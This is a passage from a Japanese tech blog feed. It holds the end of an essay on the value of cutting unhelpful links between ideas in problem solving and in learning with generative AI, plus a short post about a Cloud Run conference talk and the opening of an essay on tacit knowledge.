わせを試す段階も、AIが代わりにやってくれます。アイデアの出現を待つ必要もありません。すぐに解決策が提示されます。確かに、速いです。効率的です。でも、何かが失われています。それは単に「喜びを失う」という話ではありません。もっと本質的な問題があります。AIが提示するつながりは、AIの文脈でのつながりです。私の文脈でのつながりではありません。私がループと配列をつなげた時、それは私のコードの中で、私の問題を解決するために、つながりました。私の手を動かして、私のエラーを見て、私の頭で理解しました。だから、次に似た問題に出会った時、自分でつなげられます。でも、AIの答えをそのまま使うと、そのつながりは私のものになりません。AIがどうやってつなげたのか、なぜそうつなげたのか、私の文脈では本当に正しいのか、分かりません。そして、次に似た問題に出会った時、また同じようにAIに聞くしかありません。これは、この文章で語ってきた8つの段階との関係で考えると、より明確になります。第一段階の「問いを明確にする」。AIに曖昧な問いを投げても、それなりの答えが返ってきます。だから、問いを明確にする訓練ができません。でも、問いが曖昧なら、答えもまた曖昧です。AIが返した答えが、本当に自分が求めていた答えなのか、判断できません。第二段階の「問題を分解する」。AIは既に分解された答えを返します。だから、どう分解されたのか、なぜそう分解されたのか、自分の問題にとって適切な分解なのか、分かりません。第三段階の「関係者の望みを理解する」。これはAIには絶対にできません。私のチームの運用チームが何を恐れているか、ビジネス側が本当に求めているものは何か、AIは知りません。でも、AIの答えをそのまま使うと、この段階を飛ばしてしまいます。第四段階の「知識を集める」。AIは既に知識を持っています。だから、自分で知識を集める必要がありません。でも、自分で集めないと、どの知識が重要か、どの知識が自分の文脈に合うか、判断できません。第五段階の「組み合わせを試す」。AIは最適な組み合わせを提示します。でも、なぜ他の組み合わせがダメなのか、自分で試していないから分かりません。そして、断つべき組み合わせを自分で見極める能力が育ちません。第六段階の「無意識に任せる」。AIに聞けば瞬時に答えが出ます。だから、無意識が働く時間がありません。でも、無意識の並列処理こそが、意外なつながりを生み出します。第七段階の「アイデアが出現する」。AIがアイデアを提示します。でも、それは私のアイデアではありません。私の頭の中でつながりが出現する瞬間を、経験できません。第八段階の「検証する」。これが最も重要です。AIの答えを検証せずに使うと、間違った答えに気づけません。でも、検証するためには、前の7つの段階を理解している必要があります。プロセスが圧縮されすぎて、各段階で得られる学びが失われます。そして、最も危険なのは、つながりを断つ能力が育たないことです。AIの答えには、全てがつながっているように見えます。でも、実際には、自分の文脈に合わない部分があります。複雑すぎる部分があります。不要な部分があります。それらを断つ必要があります。でも、自分でつなげる経験がないと、何を断つべきか判断できません。この文章で語ってきたように、問題解決とは、つなげることと断つことの往復運動です。でも、AIに全てを任せると、つなげることだけが起きて、断つことが起きません。そして、つながりすぎた複雑な解決策を、そのまま実装してしまいます。あの失敗したプロジェクトと同じことが起きます。では、生成AIの時代に、どうすればいいのでしょうか。AIを、対話の相手として使います。答えを得るのではなく、自分の考えを確認するために使います。第一段階で、問いを明確にした後、AIに聞きます。「この問いは明確か」と。AIの答えを見て、自分の問いを修正します。第二段階で、問題を分解した後、AIに聞きます。「この分解は適切か」と。AIの分解と比較して、自分の分解を見直します。第四段階で、知識を集めた後、AIに聞きます。「他にどんな知識があるか」と。AIが提示した知識の中から、自分の文脈に合うものを選びます。合わないものは断ちます。第五段階で、組み合わせを試した後、AIに聞きます。「この組み合わせは有効か」と。AIの答えを見て、自分が見落としていた組み合わせに気づきます。でも、最終的には自分で判断します。第八段階で、検証する時、AIに聞きます。「この設計の問題点は何か」と。AIが指摘した問題を、自分で検証します。そして、必要なら修正します。重要なのは、AIの答えをそのまま使わないことです。AIの答えを、自分の文脈に翻訳します。自分の制約条件に合わせて修正します。不要な部分を断ちます。そして、自分の頭で理解してから、使います。ここで、もう1つ重要な洞察があります。AIと書籍では、知識の与え方が根本的に違います。AIは、私の質問に答えます。私が「ループとは何か」と聞けば、ループについて教えてくれます。私が「配列とは何か」と聞けば、配列について教えてくれます。でも、AIは「次にどういう質問をすべきか」を教えてくれません。私の文脈で、私の質問に、答えるだけです。一方、書籍は違います。著者が、入門者に対して、「この順番で学べば、つながりが見えてくる」という道筋を設計しています。最初にループを説明します。次に配列を説明します。そして、ループと配列を組み合わせる例を示します。この順番には、意味があります。著者が何年もかけて習得した知識を、どういう順序で、どういうつながりで学べば理解できるか、深く考えて構成されています。書籍は、知識そのものだけでなく、知識のつながりの構造を教えてくれます。AIに「ループと配列をどう組み合わせるか」と聞けば、答えは返ってきます。でも、なぜループの後に配列を学ぶべきなのか、なぜその逆ではないのか、この2つの概念がどう関連しているのか、その関連性を理解するためには何を知っておくべきか、そういう「メタ的なつながり」は教えてくれません。これは、この文章で語ってきた8つの段階との関係で、より深刻な問題になります。第一段階の「問いを明確にする」。書籍を読むと、著者が「こういう問いを立てると良い」という例を示してくれます。章立てそのものが、問いの構造を示しています。でも、AIに質問すると、自分が立てた問いにしか答えてくれません。「次にどういう問いを立てるべきか」は、自分で考えなければなりません。でも、初学者は、次にどういう問いを立てるべきか、分かりません。だから、同じような質問を繰り返したり、重要な問いを見逃したりします。書籍なら、著者が「この章の後は、こういう問いが生まれるはずだ。だから次の章でそれに答える」という構成を作っています。第二段階の「問題を分解する」。書籍は、複雑な問題をどう分解するかの例を示してくれます。章が進むごとに、徐々に複雑な問題に取り組んでいきます。その過程で、分解の技術を学べます。でも、AIに質問すると、既に分解された答えが返ってきます。分解のプロセスは見えません。第四段階の「知識を集める」。書籍は、どういう知識を、どういう順番で集めるべきか、道筋を示してくれます。関連する知識への参照を示してくれます。でも、AIは、質問された知識だけを返します。「この知識を理解するためには、先にあの知識を学ぶべきだ」という構造は見えません。AIは、点で答えます。書籍は、線で教えます。点だけを集めても、線にはなりません。自分で点をつなげなければなりません。でも、どう点をつなげるべきか、初学者には分かりません。だから、間違ったつなげ方をしたり、つなげるべき点を見逃したりします。書籍は、著者が既につないだ線を見せてくれます。その線をなぞることで、つなげ方を学べます。そして、次に別の点に出会った時、自分でつなげられるようになります。もちろん、AIにも利点はあります。自分の文脈に特化した答えが得られます。書籍にない最新の情報が得られます。対話的に質問を深掘りできます。でも、知識のつながりの構造を学ぶためには、書籍の方が優れています。だから、私は両方を使います。書籍で、知識のつながりの構造を学びます。どういう順番で学べば理解できるか、著者の道筋をたどります。そして、その構造を理解した上で、AIで具体的な疑問を解消します。自分の文脈に合わせた応用例を聞きます。書籍が線なら、AIは点です。線を理解してから、点を集めます。点だけを集めても、線は見えません。でも、線を理解していれば、点をどこに配置すべきか分かります。生成AIの時代だからこそ、書籍の価値が高まります。AIは答えを速く返してくれますが、答えに至る道筋は示してくれません。書籍は遅いですが、道筋を示してくれます。その道筋こそが、つながりを見出す能力を育てます。AIは、8つの段階を圧縮してしまいます。だから、意識的に8つの段階を経験する必要があります。AIを使いながらも、問いを明確にする時間を持ちます。知識を集める時間を持ちます。組み合わせを試す時間を持ちます。無意識に任せる時間を持ちます。そして、つながりを断つ訓練を、意識的に行います。AIの答えの中から、「これは自分の文脈には合わない」と判断して、断ちます。「これは複雑すぎる」と判断して、シンプルにします。「これは不要だ」と判断して、削除します。生成AIは、強力なツールです。うまく使えば、問題解決を加速できます。でも、全てを任せると、つながりを見出す能力も、つながりを断つ能力も、両方失います。だから、自分の頭でつなげます。AIに任せません。そして、自分の文脈で断ちます。AIの答えを鵜呑みにしません。速さだけを求めるのではなく、理解の深さを求めます。効率だけを求めるのではなく、没入する時間を確保します。AIを使いながらも、8つの段階を意識的に経験します。それが、生成AIの時代に、つながりを見出し続けるための道です。異なる領域を結びつけることで、新しい価値が生まれるプログラミングを始めた頃、私は1つの言語しか知りませんでした。それでコードを書いていました。でも、別の言語を学んだ時、視野が広がりました。「ああ、こういう書き方もあるのか」。そして、1つの言語で学んだパターンを、別の言語で応用できることに気づきました。チーム開発を始めた時、私はエンジニアしか知りませんでした。でも、デザイナーと働き始めた時、視点が変わりました。「なるほど、ユーザーはこう見ているのか」。ビジネス側の人と話した時、優先順位の付け方が変わりました。「そうか、これが重要なのか」。異なる視点をつなげることで、理解が深まります。問題の本質が見えます。解決策が生まれます。これは、つながりの本質です。アイデアとは、既存の要素の新しい組み合わせです。まったく新しいものなど、存在しません。すべては、既存の要素を、新しい方法でつなげたものです。でも、その組み合わせ方が新しければ、それは価値ある解決策になります。つなげてください。異なる知識を。異なる視点を。異なる人々を。つなげることで、世界は進歩します。でも、私は間違ったその大きなプロジェクトに戻りましょう。つながりの力を知った私は、すべてをつなげようとしました。最新の技術を学びました。新しいパターンを適用しました。異なる領域のベストプラクティスを取り入れました。マイクロサービス、イベント駆動、関数型プログラミング、リアクティブプログラミング。すべてを組み合わせました。設計は美しかったです。紙の上では理想的でした。でも、実装を始めると、問題が次々と出てきました。複雑すぎて、誰も理解できません。デバッグに膨大な時間がかかります。新機能の追加が困難になります。パフォーマンスは改善しましたが、開発速度は大幅に低下しました。チームは疲弊していきました。私は混乱しました。すべてを正しくつなげたはずでした。最適な技術を選び、最新のパターンを適用し、ベストプラクティスに従いました。なぜ、うまくいかないのでしょうか。数週間悩んだ後、私はある事実に気づきました。問題は、つなげすぎたことでした。必要ないものまでつなげました。複雑にする必要のないところを複雑にしました。そして何より、間違った前提を断てなかったことが問題でした。私は「最新の技術は優れている」という前提を疑いませんでした。「複雑なアーキテクチャは柔軟性をもたらす」と信じ込みました。でも、これらの前提は、私たちのプロジェクトには合っていませんでした。チームは小さく、変更は頻繁で、複雑さを管理するリソースはありませんでした。シンプルなアプローチの方が、遥かに適していました。つなげることに夢中になりすぎて、断つべきものを見逃していました。そして、もっと根本的な問題がありました。学んだことを、アンラーンできなかったのです。アンラーンとは、学習を解除することです。一度学んだ知識や信念を、意識的に手放すことです。これは、新しいことを学ぶよりも難しいです。なぜなら、学んだことは、自分の思考の一部になっているからです。それを疑うことは、自分自身を疑うことになります。私は、過去のプロジェクトで学んだパターンを持っていました。「大規模システムではマイクロサービスが有効だ」「イベント駆動は疎結合をもたらす」。これらは、確かに正しい状況もあります。でも、すべての状況で正しいわけではありません。過去の成功体験は、時に次の失敗の原因になります。以前うまくいったアプローチが、今回もうまくいくとは限りません。でも、人間は過去の成功を手放すことが難しいです。「これで成功したのだから、今回も使うべきだ」と考えてしまいます。アンラーンは、新しい知識を得る前に、古い知識を疑うことです。「この知識は、今の状況に本当に適用できるのか」と問うことです。そして、適用できないと分かったら、躊躇なく手放すことです。その時、私は理解しました。つなげることだけが答えではありません。もう半分は、断つことです。そして、断つためには、まずアンラーンすることが必要なのです。つながりを断つことは技術であるつなげることは本能ですが、断つことは技術です。一度見出したパターンを否定することは、本能に反します。「これとこれは関係がある」と信じているものを、「いや、関係ない」と認めることは、認知的な苦痛を伴います。既に投資した時間と労力が無駄になります。自分の判断が間違っていたと認めなければなりません。断つことは、本能ではありません。技術です。意識的に訓練しなければ、身につきません。コードを書いていて、ある実装に三時間かけたとします。でも、レビューで別のアプローチの方が良いと指摘されます。この時、人間の本能は「三時間を無駄にしたくない」と抵抗します。でも、優れたエンジニアは躊躇なく捨てます。三時間のサンクコストより、今後何年も保守されるコードの品質の方が重要だと知っているからです。つながりを断つ技術を持っていない人間は、一度つなげたものを手放せません。そして、つながりはどんどん増えていきます。最初は小さな勘違いだったものが、関連する情報を次々と取り込んで、巨大な信念体系になります。そして、その信念体系全体を否定することは、もはや不可能になります。この現象は、エンジニアリングの世界だけでなく、あらゆる分野で起きます。医療の診断、ビジネスの意思決定、人間関係の理解。そして、最も極端な形で現れるのが、陰謀論です。つながりを断つ技術がないと、どうなるでしょうか。陰謀論という極端な例を見れば、その危険性がよく分かります。物語に囚われるということ陰謀論や物語に深く囚われている人間を観察していて気づいたことがあります。彼らは新しいつながりを作ることが得意です。一見無関係な出来事から、驚くべき関連性を見出します。その発想力は、時に感心するほどです。問題は、彼らがつながりを断てないことです。普通の人間は、仮説を立てます。「AとBには関係があるかもしれない」。そして検証します。証拠を探します。反証も探します。もし関係がなさそうなら、その仮説を捨てます。つながりを断ちます。でも、物語に囚われた人間は違います。「AとBには関係がある」と一度信じたら、もう断ちません。反証が出てきても、別の解釈で説明します。証拠がなくても、証拠の不在を何らかの理由で正当化します。つながりを断つのではなく、さらに別のつながりを作って補強します。これは、つながりの創造性の問題ではありません。つながりの破棄能力の問題です。エンジニアがバグに遭遇したとします。「このエラーは、たぶんメモリリークが原因だ」と仮説を立てます。調査します。でも、メモリ使用量は正常でした。この時、優れたエンジニアはすぐに仮説を捨てます。「メモリリークではない」と認めて、別の原因を探します。でも、経験の浅いエンジニアは、最初の仮説に固執することがあります。「メモリ使用量が正常に見えるのは、測定方法が間違っているからだ」と考えます。「実は隠れたメモリリークがあるはずだ」と探し続けます。数時間を無駄にした後、ようやく別の原因に気づきます。つながりを断てないことが、探索を非効率にします。物語に囚われた人間も同じです。最初の仮説に固執して、それを支持する情報だけを集め続けます。反証する情報は、何らかの形で無効化されます。つながりは増え続けますが、決して減りません。そして最終的に、巨大で複雑で、誰にも検証不可能な信念体系ができあがります。もちろん、これは陰謀論だけの話ではありません。私たち全員が、程度の差こそあれ、この傾向を持っています。自分が信じたいことを信じ、信じたくないことを疑います。都合の良い情報を集め、都合の悪い情報を無視します。だからこそ、意識的につながりを断つ訓練が必要なのです。エコーチェンバーとは、つながりを断つ機会がない空間だSNSのエコーチェンバーが問題なのは、同じ意見ばかりが反響するからだと言われます。でも、本質はそこではありません。本質は、つながりを断つ機会がないことです。人間は誰でも、間違ったつながりを作ります。「これとこれは関係がある」と思い込みます。でも、通常はそのつながりを断つ機会があります。友人が「それ、違うんじゃない？」と指摘してくれます。本を読んでいて、自分の考えと矛盾する事実に出会います。議論の中で、自分の論理の穴に気づきます。これらの経験が、間違ったつながりを断つきっかけになります。でも、エコーチェンバーの中では、そのきっかけがありません。全員が同じつながりを信じています。だから、誰もそれを疑いません。間違ったつながりでも、誰も指摘しません。むしろ、そのつながりを補強する情報ばかりが流れてきます。つながりを作る機会は無限にありますが、つながりを断つ機会はゼロです。これは、情報の多様性の問題ではありません。つながりの新陳代謝の問題です。健全な思考には、つながりを作ることと断つことの両方が必要です。でも、エコーチェンバーの中では、作ることだけが起きて、断つことが起きません。だから、つながりは増殖し続けます。最初は小さな偏見だったものが、関連する情報を取り込んで、巨大な世界観になります。そして、その世界観を支えるつながりは、あまりに多く、あまりに複雑になって、もはや1つ1つを検証することすら不可能になります。私がエコーチェンバーから出た方がいいと思うのは、多様な意見を聞くためではありません。つながりを断つ機会を得るためです。自分が信じているつながりを、誰かに疑ってもらうためです。「それ、本当に関係あるの？」と聞かれて、立ち止まって考えるためです。検証とは、つながりを一度断つことだあのプロジェクトを一からやり直した時、私は新しいアプローチを取りました。つなげる前に、断つことから始めました。本当に必要な機能は何でしょうか。不要なものは何でしょうか。どの前提が正しく、どの前提が間違っているでしょうか。1つ1つ検証しました。そして、断つべきものを断ちました。検証とは、自分のつながりを一度断つことです。自分にとって自明なつながりを、疑ってみます。本当につながっているのでしょうか。それとも、自分がそう信じているだけでしょうか。アイデアが浮かんだら、それを他者の視点で見ます。自分一人で考えていると、自分のつながりが正しく見えます。でも、他人に説明しようとすると、論理の穴が見えます。「ここ、つながってないじゃん」と気づきます。他人は、あなたの思い込みを共有していません。だから、あなたが当然だと思っているつながりを疑います。「なぜAとBがつながるの？」と聞きます。その質問に答えられないとき、そのつながりは思い込みだったと分かります。実際に他人に説明する必要はありません。頭の中で、他人の視点を想像すればいいです。「このアイデアを、知識のない人に説明するとしたら、どう説明するか」。説明しようとすると、自分の理解が曖昧な部分が見えてきます。あなたが見ているものは、他人にも見えるでしょうか。この問いが、つながりの妥当性を確認します。自分だけに見えるつながりは、主観です。他人にも見えるつながりが、客観です。そして、実装します。頭の中でつながっていても、現実ではつながらないことがあります。理論的には正しくても、実装すると問題が出ます。だから、試します。そして、問題が出たら、そのつながりを断ちます。実装とは、つながりの淘汰プロセスです。無数のつながりを試して、ほとんどを捨てます。残ったわずかなつながりが、本当に機能するアイデアになります。ここで重要なのは、部分的に断つ能力です。アイデア全体を捨てるのではなく、うまくいかない部分だけを捨てます。AとBとCのつながりのうち、Bだけがうまくいかないなら、Bを断って、AとCのつながりを残します。そして、Bの代わりにDを試します。破棄とは、全体を捨てることではなく、不要な部分だけを切り離すことです。手術のように、病んだ部分を切除して、健康な部分を残します。問題解決とは、既存のつながりを断つことから始まるプロジェクトをやり直した結果、設計はシンプルになりました。理解しやすくなりました。開発速度は上がり、バグは減り、パフォーマンスも改善しました。そして何より、チーム全員が幸せになりました。何が変わったのでしょうか。つなげることを減らしました。断つことを増やしました。課題を設定する段階で、他のすべての課題を断ちました。収集する段階で、無関係な情報を断ちました。咀嚼する段階で、ほとんどの組み合わせを断ちました。実装する段階で、うまくいかない部分を断ちました。無数の可能性の中から、ほとんどを捨てました。残ったわずかなものを磨きました。それが、問題解決でした。彫刻家は、石を削ります。削ることで、形が生まれます。作家は、言葉を削ります。削ることで、文章が研ぎ澄まされます。エンジニアは、コードを削ります。削ることで、設計が明確になります。問題解決とは、加えることではなく、削ることです。つなげることだけではなく、断つことです。そして、断つことができて、初めて、本当に価値のあるつながりが残ります。断つ技術を身につけるでは、どうすればつながりを断てるようになるのでしょうか。私は新しい技術を学ぶとき、必ず反証を探します。「この技術は素晴らしい」という宣伝文句を読んだら、すぐに「この技術の欠点は何か」を探します。「どんな場合には向いていないか」を調べます。最初から反証を探すことで、技術と「素晴らしい」の間の安易なつながりを断ちます。そして、どんな文脈で、どんな問題に対して、この技術が有効なのか、正確に理解できます。コードを書いたら、一度捨てます。ゼロから書き直します。同じ機能を、別のアプローチで実装してみます。これは時間の無駄に見えるかもしれません。でも、最初の実装と「正しい」の間のつながりを断つ訓練になります。「動いたから正しい」と思い込みません。別のアプローチの方が、もっと良いかもしれません。実際に書き直してみると、最初の実装の問題点が見えてきます。一年前の自分と、今の自分で、考えが変わったことを書き出します。「以前はこう思っていたが、今はこう思う」。これは、過去の自分と現在の自分の間のつながりを断つ訓練になります。「過去の自分が信じていたことは、今の自分も信じるべきだ」という思い込みを捨てます。実際にやってみると、驚くほど多くのことが変わっていることに気づきます。時間をかけたものを、躊躇なく捨てます。三時間かけて書いたコードでも、より良いアプローチがあれば書き直します。一週間かけて調べた技術でも、プロジェクトに合わなければ採用しません。これは、努力と成果の間のつながりを断つ訓練になります。「時間をかけたから価値がある」という思い込みを捨てます。価値があるかどうかは、どれだけ時間をかけたかではなく、どれだけ問題を解決するかで決まります。自分が信じていることを、他人に説明します。特に、その分野に詳しくない人に説明します。説明しながら、「あれ、これ、うまく説明できないな」と気づくことがあります。それは、自分の理解と「正しい」の間のつながりが、実は曖昧だったということです。説明できないということは、本当は理解していないということです。つながりと断つことの往復運動つながりを断つことは、難しいです。認知的にも、感情的にも、社会的にも。一度見出したパターンを忘れることは、ほとんど不可能です。自分の判断が間違っていたと認めることは、苦痛です。周りの人間が信じているつながりを断つことは、孤立を意味します。それでも、断たなければなりません。なぜなら、断たなければ、成長できないからです。間違ったつながりを持ち続けている限り、正しいつながりは作れません。古い理解を手放さない限り、新しい理解は得られません。過去の自分に固執する限り、未来の自分にはなれません。断つことは、破壊ではありません。更新です。古いバージョンを削除して、新しいバージョンをインストールすることです。プログラムは、定期的に更新しなければ、脆弱性を抱えたまま動き続けます。思考も同じです。定期的につながりを見直して、間違ったつながりを断って、新しいつながりを作らなければ、脆弱なまま考え続けることになります。おわりにあのプロジェクトから数年が経ちました。今、私は別のプロジェクトに取り組んでいます。相変わらず、設計で悩むことはあります。アプローチで迷うことはあります。でも、以前とは違うことが1つあります。躊躇なく捨てられるようになりました。一週間かけて書いたコードでも、より良い方法があれば書き直します。チーム全員で決めた設計でも、問題があれば提案し直します。昨日まで正しいと思っていたことでも、今日は疑えます。これは能力の問題ではありませんでした。姿勢の問題でした。サンクコストを恐れない姿勢。過去の判断に縛られない姿勢。そして何より、間違いを認めることを恐れない姿勢。人間は、つながりを見出す生き物です。パターンを探します。関係性を発見します。意味を作り出します。これは本能です。でも、つながりを断つことは本能ではありません。意識して訓練しなければ、身につきません。プログラミングを学び始めたとき、私は「どうやってつなげるか」ばかり考えていました。データ構造とアルゴリズムをつなげます。フロントエンドとバックエンドをつなげます。理論と実装をつなげます。でも、本当に重要だったのは「どうやって断つか」でした。間違ったアプローチを断ちます。無駄な複雑性を断ちます。過去の判断を断ちます。そして、最も難しいのは、自分の思い込みを断つことでした。つながりを断つことは、否定ではありません。更新です。昨日の自分を否定するのではなく、今日の自分にアップデートします。古いバージョンを削除して、新しいバージョンをインストールします。でも、ここで誤解してほしくないことがあります。これは「つながるな」「つなげるな」という話ではありません。つながることは人間の本能であり、問題解決の源泉です。それを否定することは、人間であることを否定することに等しいです。私が言いたいのは、つなげたものを、多様な面で検証してほしいということです。「AとBは関係がある」と思ったとき、それを検証します。技術的に正しいでしょうか。論理的に整合しているでしょうか。他の事例でも成り立つでしょうか。他者から見ても妥当でしょうか。実装してみて機能するでしょうか。そして、検証した結果、うまくいかなかったら、そのつながりを保持しておいてよいか、もう一度考えます。もしかしたら、部分的には正しいかもしれません。ある条件下では有効かもしれません。別の文脈では使えるかもしれません。だから、すぐに断つ必要はないこともあります。でも、「常に正しい」「すべての状況で有効」と思い込むのは危険です。つながりには、適用範囲があります。前提条件があります。文脈があります。これらを無視して、つながりを普遍化しないこと。「この状況では有効だが、別の状況では違うかもしれない」と認識すること。この謙虚さが、つながりを適切に扱う技術の核心です。検証してダメだったつながりを、無理に保持し続けません。でも、すぐに捨てる必要もありません。保留にしておきます。別の角度から見直します。条件を変えて試してみます。そして、やはりダメだと分かったら、そこで初めて手放します。異なる知識をつなげます。異なる視点をつなげます。異なる人々をつなげます。そして、検証します。技術的に。論理的に。実践的に。多様な面から。そして、考え直します。このつながりは本当に有効でしょうか。どんな条件で成り立つでしょうか。どんな状況では成り立たないでしょうか。つなげることと検証すること。そして必要なら手放すこと。この往復運動ができて、初めて、本当の解決策が生まれます。そして、つながりに対して誠実であることが、この往復運動を可能にします。参考資料アイデアのつくり方作者:ジェームス W.ヤングCCC MEDIA HOUSEAmazon世界は認知バイアスが動かしている 情報社会を生きぬく武器と教養作者:栗山 直子SBクリエイティブAmazon情報を正しく選択するための認知バイアス事典作者:情報文化研究所フォレスト出版Amazon情報を正しく選択するための認知バイアス事典 行動経済学・統計学・情報学 編作者:情報文化研究所フォレスト出版AmazonTHINK BIGGER 「最高の発想」を生む方法：コロンビア大学ビジネススクール特別講義 (NewsPicksパブリッシング)作者:シーナ・アイエンガーニューズピックスAmazonTHINK AGAIN 発想を変える、思い込みを手放す (単行本)作者:アダム・グラント三笠書房Amazonリバース思考　超一流に学ぶ「成功を逆算」する方法作者:ロン・フリードマンかんき出版Amazon具体と抽象作者:細谷 功dZERO（インプレス）Amazon構想力が劇的に高まる アーキテクト思考――具体と抽象を行き来する問題発見・解決の新技法作者:細谷 功,坂田 幸樹ダイヤモンド社Amazon危険だからこそ知っておくべきカルトマーケティング作者:雨宮純ぱる出版Amazon増補改訂版 スマホ時代の哲学 なぜ不安や退屈をスマホで埋めてしまうのか (ディスカヴァー携書)作者:谷川嘉浩ディスカヴァー・トゥエンティワンAmazon","isoDate":"2025-11-16T23:52:07.000Z","dateMiliSeconds":1763337127000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud で目指す クラウド二刀流エンジニア講座第3回に登壇してきました。","link":"https://blog.masasuzu.net/entry/2025/11/16/203546","contentSnippet":"11/14に Google Cloudで目指すクラウド二刀流エンジニア講座第3回 に登壇してきました。cloudonair.withgoogle.com第1回でパネルディスカッションに出てきたのに引き続き、今回は Fargate との差分で理解する、Cloud Run のシンプルな魅力 と題して登壇させていただきました。AWSをもうすでに使ってる方向けにECS Fargateと比較しつつCloud Runのシンプルな魅力を紹介するセッションとなっていました。視聴登録すればこちらから動画が見れるかと思います。資料も後ほどこちらに上がると思います。内容としては以下のような話をしました。Cloud Runの概要紹介ECS FargateとCloud Runのアプリケーションアーキテクチャ比較ネットワーク機能の紹介セキュリティ機能の紹介運用監視機能の紹介今回はCloud Runを使ってない人向けに概要紹介するセッションだったので、深入りできていない部分や説明不足、端折ったところがたくさんあります。これについてはどこかでエントリ書きたいと思ってます。とにかくCloud Runはいいぞ!ということが伝わっていれば何よりです。Cloud Runの良さを伝えたつもりですが、あくまでなんでも適材適所でFargateが向いているコンテキストに無理やり変える必要はなく、比較検討できる選択肢の一つとしてCloud Runを入れていただけたらと思います。スライドにもう少し図表を入れた方が伝わったかなとか反省点はありつつも、40分トークは初めてだったのですごくいい経験になりました。今後ももっと大きなところで登壇できるように精進していきます。","isoDate":"2025-11-16T11:35:46.000Z","dateMiliSeconds":1763292946000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"おい、言語化しろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/14/112023","contentSnippet":"はじめに「言語化」という言葉を聞くたびに、私は少しだけ居心地が悪くなる。この感覚に初めて気づいたのは、数年前の、ある夏の午後だった。後輩エンジニアとの1on1で、私は彼にコードレビューのコツを教えようとしていた。モニターに映るコードを指差しながら、「このコードの何が良くないか、分かる？」と聞いた。彼は首を横に振った。私は言葉を探した。「ここの設計が、将来の拡張性を損なっている」「この命名は意図が伝わりにくい」「ここのロジックは複雑すぎる」。彼は真面目にメモを取った。頷いた。理解したような表情をした。でも、次のレビューでも、同じ問題が繰り返された。その次も。さらにその次も。私は、教え方が下手なのだと思った。説明が足りないのだと思った。もっと丁寧に、もっと具体的に、もっと分かりやすく。そう思って、さらに言葉を重ねた。三ヶ月が過ぎた。ある日、彼は変わっていた。私が指摘していたような問題を、自分で見つけるようになっていた。的確に、瞬時に、まるで当然のように。「どうやって分かるようになったの？」私は聞いた。彼は少し困った顔をした。「うーん...なんとなく、見れば分かるようになりました」。その瞬間、私は理解した。私がどれだけ言葉を尽くしても、彼に伝わらなかった理由を。そして、三ヶ月後に突然彼ができるようになった理由を。「なんとなく」。この言葉が、すべてを物語っていた。彼は確かに知っている。何が良いコードで何が悪いコードか。しかし、その知識は言葉にならない。なぜそう判断できるのか、説明できない。私も同じだった。瞬時に判断できる。でも、その判断基準を言語化しきれない。言語化しようとすると、何か大切なものが抜け落ちてしまう気がする。私が三ヶ月間、必死に言語化しようとしていたもの。それは、実は言語化できないものだったのかもしれない。あるいは、言語化してはいけないものだったのかもしれない。この経験が、私に1つの問いを突きつけた。私たちは本当に、すべてを言語化すべきなのか。言語化できないものには、価値がないのか。そして、そもそも「言語化」とは、何なのか。この問いについて、考え続けた数年間の思考を、ここに記す。矛盾しているのは分かっている。言語化できないものについて、言語化しようとしているのだから。でも、この矛盾こそが、たぶん、この問題の本質なのだと思う。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。知識の水面下にあるもの数年前の後輩とのやり取りを思い返すと、私は1つの事実に気づく。彼は、最初は分からなかった。でも、三ヶ月後には分かるようになった。そして、「どうやって分かるようになったのか」と聞かれても、説明できなかった。これは、奇妙なことだ。彼は明らかに何かを知っている。その知識を使って、正確に判断している。でも、その知識を言葉にできない。自転車に乗る時のことを考えてみよう。あなたは、バランスを取っている。どうやって？説明できない。でも、確実にバランスを取っている。倒れそうになった瞬間、身体が自動的に反応する。ハンドルを少し切る。体重を移動する。無意識に、瞬時に、正確に。もしこの一連の動作を言語化しようとしたら、どうなるか。「体重を右に3度傾ける。同時にハンドルを左に2度切る。視線は前方5メートルの地点を...」。数百の変数を、リアルタイムで調整している。それを言葉にしようとすると、膨大な説明になる。そして、その説明を読んで理解したところで、自転車には乗れない。なぜか。言語化すると、タイミングが失われるからだ。自転車に乗る時、身体は並列処理をしている。視覚、平衡感覚、筋肉のフィードバック、これら全てを同時に処理している。そして、処理している間も、状況は変わり続けている。でも、言語は逐次的だ。1つずつ、順番に。言語化している間に、バランスは崩れる。つまり、知識には2つの形態がある。言葉になる知識と、言葉にならない知識。そして、後者の方が、圧倒的に多い。 私たちが意識している知識は、氷山の一角だ。その下に、巨大な、言語化されない知識の大陸が広がっている。歩く。話す。顔を認識する。危険を察知する。空気を読む。これら全て、言葉にならない。でも、私たちは確実に知っている。なぜ知識は形を変えなければならないのかここで、根本的な問いに向き合う必要がある。なぜ知識は、1つの形に留まらないのか。後輩が「なんとなく分かるようになった」と言った時、実際には何が起きていたのか。彼の中で、知識の形が変わったのだ。最初、彼は何も知らなかった。次に、私の説明を聞いて、言葉として知った。でも、それだけでは使えなかった。そして三ヶ月後、彼は「見れば分かる」ようになった。説明なしに、瞬時に判断できるようになった。知識は3つの形を経由した。無知 → 言語化された知識 → 身体化された知識この変容は、なぜ必要だったのか。答えは、速度にある。実践の速度は、言語の速度を超える言語化された知識のままでは、実践で使えなかった。コードを見るたびに、マニュアルを確認し、チェックリストと照合し、判断する。これでは、遅すぎる。コードレビューの場では、瞬時の判断が求められる。「考える」時間はない。「見た瞬間に分かる」必要がある。言語は、本質的に一本道だ。この文章を読んでいるあなたは、一語ずつ、順番に処理している。「言語」「は」「本質的に」「一本道」「だ」。5つの単語が、時間軸に沿って一列に並んでいる。あなたは、5つを同時に読むことはできない。必ず、順番に、1つずつ。これは、言語の宿命だ。線形性。1次元性。1つずつしか処理できない性質。でも、実践はそうじゃない。自転車に乗る時、視覚情報、平衡感覚、筋肉の張力、ペダルの圧力、風の強さ、路面の傾き、周囲の音。無数の情報を、同時に、瞬時に処理している。そして、無数の筋肉の調整を、同時に、リアルタイムで実行している。並列処理。多次元処理。すべてが同時に起きている。だから、言語化された知識は、身体化された知識に変容しなければならない。言葉の形から、身体の形へ。逐次処理から、並列処理へ。意識的な判断から、無意識の反応へ。これが、知識が形を変える第一の理由だ。実践には、言語を超えた速度が必要だからだ。しかし、身体化された知識は、共有できないここで、問題が生じる。知識が身体化された瞬間、それは共有不可能になる。私が持っている身体化された知識を、後輩に伝えたい。でも、それは直接伝達できない。なぜなら、言語化できないからだ。そして、言語なしに